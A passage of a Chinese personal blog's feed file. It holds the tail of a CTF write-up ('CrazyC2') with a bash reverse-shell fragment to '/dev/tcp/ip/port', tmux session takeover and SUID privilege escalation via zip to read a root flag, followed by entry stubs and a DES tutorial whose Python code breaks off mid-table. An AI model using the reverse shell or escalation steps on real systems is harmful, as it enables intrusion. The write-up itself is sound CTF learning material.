&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1”</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-04-02-170509.png" alt="屏幕截图 2024-04-02 170509"></p><p>自己的服务器监听2333端口</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402170726047.png" alt="image-20240402170726047"></p><p>ps aux查看一下运行的程序</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402171043213.png" alt="image-20240402171043213"></p><p>可以看到C2服务器是用tmux运行的，那么用tmux回到这个会话（后来开放了ssh，用ssh连，先把自己的公钥配置进去，这里不再赘述）</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180037287.png" alt="image-20240402180037287"></p><p>有点问题，那么就先把前面的tmux进程kill了再启动，根据它给的id和key改一下server.py，kill了再启动</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180438620.png" alt="image-20240402180438620"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180615128.png" alt="image-20240402180615128"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180708976.png" alt="image-20240402180708976"></p><p>输指令反弹shell</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-04-02-180909.png" alt="屏幕截图 2024-04-02 180909"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181031310.png" alt="image-20240402181031310"></p><p>可以看到现在的用户是ctf，但是flag在&#x2F;root&#x2F;flag.txt下，需要提权</p><p>这里用suid提权，先看一下哪些文件有suid权限</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181207616.png" alt="image-20240402181207616"></p><p>在<a href="https://gtfobins.github.io/gtfobins/zip/">gtfobins</a>上面查到可以利用&#x2F;usr&#x2F;bin&#x2F;zip提权读取文件，以此得到第二个flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181337524.png" alt="image-20240402181337524"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181431988.png" alt="image-20240402181431988"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 Wrong Direction!（需要密码）</title>
      <link href="/2024/03/28/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/"/>
      <url>/2024/03/28/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="344e71637c6267b62634dd06fcbe84613e0037f70043c9e300b2c2370bd805c9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024 Writeup</title>
      <link href="/2024/03/24/NKCTF2024-Writeup/"/>
      <url>/2024/03/24/NKCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NKCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/2024/03/20/DES%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/03/20/DES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>参考了<a href="https://blog.csdn.net/weixin_52553215/article/details/124215865">这篇文章</a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>DES（Data Encryption  Standard）是一种对称加密算法，它将64位的明文分成64位的块，并使用64位的密钥来进行加密操作。虽然DES本身只能处理64位的数据块，但是可以通过分组密码模式（如ECB、CBC、CFB、OFB、CTR等）来加密更长的数据。</p><h2 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h2><p>输入明文M（64位），根据下表进行初始置换，得到IP</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">60,52,44,36,28,20,12,4,</span><br><span class="line">62,54,46,38,30,22,14,6,</span><br><span class="line">64,56,48,40,32,24,16,8,</span><br><span class="line">57,49,41,33,25,17, 9,1,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">61,53,45,37,29,21,13,5,</span><br><span class="line">63,55,47,39,31,23,15,7,</span><br></pre></td></tr></table></figure><p>如将M的第58位填入IP的第一位。</p><p>然后将IP平分为两段，L0和R0</p><h2 id="生成子密钥"><a href="#生成子密钥" class="headerlink" title="生成子密钥"></a>生成子密钥</h2><p>一图以概之</p><img src="/images/DES加密/4433f1aedb9f4df98c7cbb7a783a7bda.png" alt="4433f1aedb9f4df98c7cbb7a783a7bda" style="zoom: 80%;" /><p>首先，一开始输入的64位key按照下表进行转换，生成56位密钥（置换选择1）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">57,49,41,33,25,17,9,1,</span><br><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">60,52,44,36,63,55,47,39,</span><br><span class="line">31,23,15,7,62,54,46,38,</span><br><span class="line">30,22,14,6,61,53,45,37,</span><br><span class="line">29,21,13,5,28,20,12,4</span><br></pre></td></tr></table></figure><p>实际上，这里只从原始密钥中取了56位进行变换，原始密钥中每字节的最高位是没有被使用的。</p><p>得到子密钥（56位）后，将变换后的子密钥分成两部分，C0和D0</p><p>得到C0和D0后，分别进行循环左移位操作，得到C1<del>C16和D1</del>D16的值，每一次循环移位的位数如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1</span><br></pre></td></tr></table></figure><p>如C0&#x3D;1111000011001100101010101111</p><p>C1&#x3D;1110000110011001010101011111</p><p>C2&#x3D;1100001100110010101010111111</p><p>将每组Cn和Dn组合起来，得到十六组数据再次按照下表进行替换，得到K1~K16（置换选择2）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14,17,11,24,1,5,</span><br><span class="line">3,28,15,6,21,10,</span><br><span class="line">23,19,12,4,26,8,</span><br><span class="line">16,7,27,20,13,2,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure><h2 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h2><p>对上面初始置换中得到的L0和R0，我们在这里进行16轮加密变换，下面的图<del>（嫖来的）</del>描述了这个流程，其中函数f后面会叙述</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/2e1e54d0330a4d21a4aeada39bd0ca72.png" alt="2e1e54d0330a4d21a4aeada39bd0ca72"></p><p>由图知，L0通过与f函数运算后的结果进行异或后成为了R1，R0直接用作L1</p><p>下面是对f函数实现过程的具体描述</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/01d6b86ae2844e53b304002dc3c36db2.png" alt="01d6b86ae2844e53b304002dc3c36db2"></p><h3 id="扩充-置换："><a href="#扩充-置换：" class="headerlink" title="扩充&#x2F;置换："></a>扩充&#x2F;置换：</h3><p>此处的32位Rn先进行扩充置换变成了48位（因为我们需要将其与48位的子密钥异或）。</p><h3 id="与密钥异或"><a href="#与密钥异或" class="headerlink" title="与密钥异或"></a>与密钥异或</h3><p>在扩充后，与之前生成的对应轮数的子密钥Kn进行异或运算</p><h3 id="代换-选择"><a href="#代换-选择" class="headerlink" title="代换&#x2F;选择"></a>代换&#x2F;选择</h3><p>将48位的数据转换为32位。这一步是整个DES算法的核心，简称S盒。</p><h4 id="S盒"><a href="#S盒" class="headerlink" title="S盒"></a>S盒</h4><p><img src="/images/DES%E5%8A%A0%E5%AF%86/e6cccba809c648ad96d79f2119b1d083.png" alt="e6cccba809c648ad96d79f2119b1d083"></p><p>对于每个S盒，对照着4行16列的表，6比特输入中的第1比特和第6比特组成的二进制数来确定行，中间4位二进制数来确定列，对应行、列位置的十进制数的4位二进制数表示作为输出。</p><h3 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h3><p>经过置换表进行置换</p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>与对应环节的Ln进行异或</p><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>将L16和R16位置交换</p><h2 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h2><p><strong>这里的置换方式与前面的不一样！</strong></p><p>这里的方式与前面的都恰好相反。</p><p>例如：</p><p>原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40,8,48,16,56,24,64,32,</span><br><span class="line">39,7,47,15,55,23,63,31,</span><br><span class="line">38,6,46,14,54,22,62,30,</span><br><span class="line">37,5,45,13,53,21,61,29,</span><br><span class="line">36,4,44,12,52,20,60,28,</span><br><span class="line">35,3,43,11,51,19,59,27,</span><br><span class="line">34,2,42,10,50,18,58,26,</span><br><span class="line">33,1,41,9,49,17,57,25</span><br></pre></td></tr></table></figure><p>至此可以得到密文C</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>参考了<a href="https://blog.csdn.net/weixin_44034444/article/details/121055630">这篇文章</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrangeSimpleDES</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 出初始化DES加密的参数</span></span><br><span class="line">        self.ip = [</span><br><span class="line">            <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">        ]  <span class="comment"># ip置换</span></span><br><span class="line"> </span><br><span class="line">        self.ip1 = [</span><br><span class="line">            <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">            <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># 逆ip置换</span></span><br><span class="line">        self.E = [</span><br><span class="line">            <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">            <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">            <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">            <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>,</span><br><span class="line">        ]  <span class="comment"># E置换，将32位明文置换位48位</span></span><br><span class="line">        self.P = [</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># P置换，对经过S盒之后的数据再次进行置换</span></span><br><span class="line">        <span class="comment"># 设置默认密钥</span></span><br><span class="line">        self.K = <span class="string">&#x27;0111010001101000011010010111001101101001011100110110100101110110&#x27;</span></span><br><span class="line">        self.k1 = [</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">            <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        ]  <span class="comment"># 密钥的K1初始置换</span></span><br><span class="line">        self.k2 = [</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">            <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">            <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>,</span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        self.k0 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, ]  <span class="comment"># 秘钥循环移位的位数</span></span><br><span class="line"> </span><br><span class="line">        self.S = [</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span 